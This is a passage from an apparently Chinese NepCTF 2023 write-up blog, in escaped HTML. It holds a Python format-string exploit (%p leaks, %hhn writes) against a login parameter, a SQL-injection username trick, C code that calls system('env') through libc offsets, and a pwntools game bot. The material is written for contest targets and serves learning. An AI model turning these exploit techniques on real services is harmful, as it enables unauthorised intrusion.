<span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = req.get(url + <span class=\"string\">&quot;/login&quot;</span>, params=&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;user&quot;</span>: <span class=\"string\">f&quot;<span class=\"subst\">&#123;start.decode()&#125;</span>%<span class=\"subst\">&#123;offset&#125;</span>$p<span class=\"subst\">&#123;end.decode()&#125;</span>&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;aaaa&quot;</span></span><br><span class=\"line\">            &#125;, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> ConnectionResetError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> TimeoutError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ConnectTimeout <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">    s = r.content</span><br><span class=\"line\">    code = s[s.find(start) + <span class=\"built_in\">len</span>(start):s.find(end)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> code</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">offset, x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> offset &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        offset += <span class=\"number\">2</span> ** <span class=\"number\">32</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = req.get(url + <span class=\"string\">&quot;/login&quot;</span>, params=&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;user&quot;</span>: <span class=\"string\">f&quot;%1000$<span class=\"subst\">&#123;x&#125;</span>c%<span class=\"subst\">&#123;offset&#125;</span>$hhn&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;aaaa&quot;</span></span><br><span class=\"line\">            &#125;, timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> ConnectionResetError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> TimeoutError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ConnectTimeout <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;retrying...&quot;</span>, e)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># p = 15196</span></span><br><span class=\"line\"><span class=\"comment\"># write(p, 0x58)</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p2 = 15513</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_s</span>(<span class=\"params\">sx</span>):</span><br><span class=\"line\">    s = struct.pack(<span class=\"string\">&quot;&lt;Q&quot;</span>, sx).strip(<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(s)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">        p = <span class=\"number\">15196</span></span><br><span class=\"line\">        write(p, <span class=\"number\">0x78</span> + i)</span><br><span class=\"line\">        <span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\">        p2 = <span class=\"number\">15511</span></span><br><span class=\"line\">        write(p2, s[i])</span><br><span class=\"line\">        <span class=\"comment\"># print(f&quot;[+] &#123;get_p(p2)&#125; =&gt; &#123;read_s(p2)&#125;&quot;)</span></span><br><span class=\"line\">        p3 = <span class=\"number\">15518</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] <span class=\"subst\">&#123;get_p(p3)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(15712)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># # xt = int(get_p(15712).decode(), 16)</span></span><br><span class=\"line\"><span class=\"comment\"># # print(f&quot;[+] &#123;xt:#x&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(15512)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(16110)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># # print(f&quot;[+] &#123;get_p(15712)&#125; =&gt; &#123;read_s(15712)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(1, 0x31, 8):</span></span><br><span class=\"line\"><span class=\"comment\"># x = xt + i</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;x:#x&#125;&quot;)</span></span><br><span class=\"line\">heap_base = <span class=\"built_in\">int</span>(get_p(<span class=\"number\">15059</span>).decode(), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-&gt;] <span class=\"subst\">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">xt = heap_base- <span class=\"number\">0x40</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-&gt;] <span class=\"subst\">&#123;xt:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\">write_s(xt)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] done&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(read_s(<span class=\"number\">15518</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write_s(0xdeadbeafdeadbeaf)</span></span><br><span class=\"line\"><span class=\"comment\"># p = 15196</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p = 15513</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125; =&gt; &#123;read_s(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># p = 15516</span></span><br><span class=\"line\"><span class=\"comment\"># print(f&quot;[+] &#123;get_p(p)&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(0x3d5b-10, 0x3d5b+100):</span></span><br><span class=\"line\"><span class=\"comment\">#     code = get_p(i)</span></span><br><span class=\"line\"><span class=\"comment\">#     if code.startswith(b&quot;0x55&quot;) or code.startswith(b&quot;0x7f&quot;) and len(code):</span></span><br><span class=\"line\"><span class=\"comment\">#         content = read_s(i)</span></span><br><span class=\"line\"><span class=\"comment\">#         # print(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125; =&gt; &#123;content&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#         logger.warning(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125; =&gt; &#123;content&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#         continue</span></span><br><span class=\"line\"><span class=\"comment\">#     # print(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#     logger.info(f&quot;[+] &#123;i&#125; =&gt; &#123;code&#125;&quot;)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HRP-CHAT\"><a href=\"#HRP-CHAT\" class=\"headerlink\" title=\"HRP-CHAT\"></a>HRP-CHAT</h2><p>这一套题都是源码审计的题目，漏洞也很简单</p>\n<h3 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a>1</h3><p>SQL注入，注意这里不能用万能密码1’ or 1&#x3D;1–因为在client中scanf不支持空格，所以就要先在数据库中注册一个用户名为1的用户，然后再次注册一个用户名为<code>1&#39;--</code></p>\n<p><img src=\"/p/2023NepCTF/image-20230814094413198.png\" alt=\"image-20230814094413198\"></p>\n<h3 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h3><p>首先分析源码（其实也不用chat的sever，只要看client的处理逻辑即可）可以看到这里Bot模式只会返回一个字符串<code>&#39;远程AI协助服务正在开发中!&#39;</code>，但是我们需要服务器返回<code>RemoteVIPApplicationCertificationHasPassed</code>这一串才能获得flag，那么我们就需要伪造服务器返回的message。我们可以看Chat模式下的服务器的原理，服务器就是转发消息进行广播。那么我们就可以想到</p>\n<p><img src=\"/p/2023NepCTF/image-20230814094950217.png\" alt=\"image-20230814094950217\"></p>\n<p>如果让一台机器在Bot模式下，另一台机器在Chat模式下</p>\n<p><img src=\"/p/2023NepCTF/image-20230814095426656.png\" alt=\"image-20230814095426656\"></p>\n<p>那么我们就可以利用广播的机制，伪造服务器返回message，这里也没有做任何校验，所以就能得到flag</p>\n<p><img src=\"/p/2023NepCTF/b9d03732b675ba6d6a492b90d01f9db.png\" alt=\"b9d03732b675ba6d6a492b90d01f9db\"></p>\n<h3 id=\"3\"><a href=\"#3\" class=\"headerlink\" title=\"3\"></a>3</h3><p>3号题目我看不太出来有啥漏洞，感觉就是正常的逻辑，抽卡获取角色，用message查看当前角色池子和技能，抽到H3h3QAQ就可以了，释放第二个技能log4j，就能打死ThTsOd了</p>\n<p><img src=\"/p/2023NepCTF/6a5cba2c75f12515107d0ae7af099ac.png\" alt=\"6a5cba2c75f12515107d0ae7af099ac\"></p>\n<h3 id=\"4\"><a href=\"#4\" class=\"headerlink\" title=\"4\"></a>4</h3><p>这个比较玄学，在我打2号flag的时候，可能是2号flag需要卡一个时机，我就写了脚本爆破，可能请求太多了，服务器就崩溃了，进入Safe box的cmd界面，输入Safe_Mode_Key就可以获得flag</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"codes\"><a href=\"#codes\" class=\"headerlink\" title=\"codes\"></a>codes</h2><p>pwn的思路打，先泄露libc，找到偏移直接system(“env”)一把梭</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1234&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">size_t</span> tmp = &amp;<span class=\"built_in\">printf</span>;</span><br><span class=\"line\">tmp -= <span class=\"number\">0x61c90</span>;</span><br><span class=\"line\">tmp += <span class=\"number\">0x52290</span>;</span><br><span class=\"line\">((<span class=\"type\">int</span> (*)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, ...))tmp)(<span class=\"string\">&quot;en&quot;</span> <span class=\"string\">&quot;v&quot;</span>);</span><br><span class=\"line\"> &#125; </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"与AI共舞的哈夫曼\"><a href=\"#与AI共舞的哈夫曼\" class=\"headerlink\" title=\"与AI共舞的哈夫曼\"></a>与AI共舞的哈夫曼</h2><p>确实不用自己写代码，GPT一把梭</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decompress</span>(<span class=\"params\">input_file, output_file</span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(input_file, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"comment\"># Read frequency information</span></span><br><span class=\"line\">        num_freq = <span class=\"built_in\">ord</span>(f.read(<span class=\"number\">1</span>))</span><br><span class=\"line\">        frequencies = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_freq):</span><br><span class=\"line\">            byte, freq = f.read(<span class=\"number\">1</span>)[<span class=\"number\">0</span>], <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">                freq = (freq &lt;&lt; <span class=\"number\">8</span>) | f.read(<span class=\"number\">1</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            frequencies[byte] = freq</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Rebuild Huffman tree</span></span><br><span class=\"line\">        root = build_huffman_tree(frequencies)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Decode compressed data</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(output_file, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> out_f:</span><br><span class=\"line\">            node = root</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                bit = f.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> bit:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                bit = <span class=\"built_in\">int</span>.from_bytes(bit, byteorder=<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (bit &gt;&gt; i) &amp; <span class=\"number\">1</span>:</span><br><span class=\"line\">                        node = node.right</span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        node = node.left</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> node.char <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                        out_f.write(<span class=\"built_in\">bytes</span>([node.char]))</span><br><span class=\"line\">                        node = root</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ConnectedFive\"><a href=\"#ConnectedFive\" class=\"headerlink\" title=\"ConnectedFive\"></a>ConnectedFive</h2><p>万宁五子棋，注意下棋到同一个位置会死机所以要，写逻辑爆破，为了提高胜率，这里采用最朴素的策略，计算每一个空白位置自己的棋子的密度，来判断哪些位置更优</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.timeout = <span class=\"number\">3</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span>: remote(<span class=\"string\">&quot;nepctf.1cepeak.cn&quot;</span>, <span class=\"number\">30582</span>)</span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getinfo</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;MESSAGE computer: &quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">    scoreboard = io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).decode()</span><br><span class=\"line\">    <span class=\"comment\"># print(f&quot;[+] Scoreboard &#123;scoreboard&#125;&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># io.recvuntil(b&quot;\\t   a b c d e f g h i j k l m n o\\n&quot;)</span></span><br><span class=\"line\">    checkerboard = []</span><br><span class=\"line\">    raw = io.recvuntil(<span class=\"string\">b&quot;\\t   a b c d e f g h i j k l m n o\\n&quot;</span>).decode()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">        <span class=\"comment\"># io.recvuntil(b&quot;\\t&quot; + bytearray([i+ord(&#x27;a&#x27;)]))</span></span><br><span class=\"line\">        r = io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>).decode()</span><br><span class=\"line\">        raw += r</span><br><span class=\"line\">        a = r.strip()</span><br><span class=\"line\">        checkerboard.append(a[<span class=\"number\">3</span>::<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"comment\"># print(checkerboard)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> scoreboard, checkerboard, raw</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&quot;abcdefghijklmno&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_pos</span>(<span class=\"params\">x, y, checkerboard: []</span>):</span><br><span class=\"line\">    res = <span class=\"number\">0</span></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">max</span>(<span class=\"number\">0</span>, x-<span class=\"number\">4</span>), <span class=\"built_in\">min</span>(<span class=\"number\">14</span>, x+<span class=\"number\">4</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">        cnt += checkerboard[i][y] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">max</span>(<span class=\"number\">0</span>, y - <span class=\"number\">4</span>), <span class=\"built_in\">min</span>(<span class=\"number\">14</span>, y + <span class=\"number\">4</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">        cnt += checkerboard[x][i] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">4</span>, <span class=\"number\">4</span>+<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= x + i &lt;= <span class=\"number\">14</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= y + i &lt;= <span class=\"number\">14</span>:</span><br><span class=\"line\">            cnt += checkerboard[x+i][y+i] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">4</span>, <span class=\"number\">4</span>+<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= x - i &lt;= <span class=\"number\">14</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= y + i &lt;= <span class=\"number\">14</span>:</span><br><span class=\"line\">            cnt += checkerboard[x-i][y+i] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_nice_pos</span>(<span class=\"params\">checkerboard</span>):</span><br><span class=\"line\">    p = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> checkerboard[i][j] <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"string\">&quot;.+&quot;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            p.append((check_pos(i, j, checkerboard), i, j))</span><br><span class=\"line\">    p.sort(reverse=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p[<span class=\"number\">0</span>][<span class=\"number\">1</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">action</span>(<span class=\"params\">checkerboard: []</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(checkerboard), end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> checkerboard:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(x), end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>()</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"comment\"># x = random.randint(0, 14)</span></span><br><span class=\"line\">        <span class=\"comment\"># y = random.randint(0, 14)</span></span><br><span class=\"line\">        <span class=\"comment\"># print(x, y)</span></span><br><span class=\"line\">        x, y = get_nice_pos(checkerboard)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> checkerboard[x][y] <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;+&#x27;</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> key[y] + key[x]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        s, c, r = getinfo()</span><br><span class=\"line\">        log.success(<span class=\"string\">f&quot;Scoreboard <span class=\"subst\">&#123;s&#125;</span>&quot;</span>)</span><br><span class=\"line\">        log.success(<span class=\"string\">f&quot;Checkerboard \\n<span class=\"subst\">&#123;r&#125;</span>&quot;</span>)</span><br><span class=\"line\">        ans = action(c)</span><br><span class=\"line\">        io.sendline(ans.encode())</span><br><span class=\"line\">    <span class=\"keyword\">except</span> EOFError:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CheckIn\"><a href=\"#CheckIn\" class=\"headerlink\" title=\"CheckIn\"></a>CheckIn</h2><p>b站发不出去，等了一会儿，flag直接在题目描述了</p>\n<p><img src=\"/p/2023NepCTF/image-20230814100358316.png\" alt=\"image-20230814100358316\"></p>\n<h2 id=\"陌生的语言\"><a href=\"#陌生的语言\" class=\"headerlink\" title=\"陌生的语言\"></a>陌生的语言</h2><p><img src=\"/p/2023NepCTF/7612dfe97ed54dfe36942465eba34b7.jpg\" alt=\"7612dfe97ed54dfe36942465eba34b7\"></p>\n<p><a href=\"https://ay.medyotan.ga/upload/lwa_moonrunes.png\">https://ay.medyotan.ga/upload/lwa_moonrunes.png</a></p>\n<p><img 